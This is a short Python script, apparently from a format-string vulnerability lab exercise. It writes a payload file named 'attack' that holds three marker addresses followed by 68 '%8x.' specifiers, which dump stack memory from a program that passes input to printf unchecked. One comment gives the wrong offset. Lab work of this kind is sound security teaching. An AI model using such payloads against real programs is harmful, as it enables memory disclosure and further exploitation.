#!/usr/bin/python3
import sys

# Initialize the content array
N=68
content = bytearray(0x0 for i in range(N*4+12))
#
number1  = 0x44434241  #ABCD
number2  = 0x48474645  #EFGH
number3  = 0x41414141  #AAAA 
content[0:4]  =  (number1).to_bytes(4,byteorder='little')
content[4:8]  =  (number2).to_bytes(4,byteorder='little')
content[8:12]  =  (number3).to_bytes(4,byteorder='little')
s = "%8x."* N 
# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('attack', 'wb') as f:
  f.write(content)
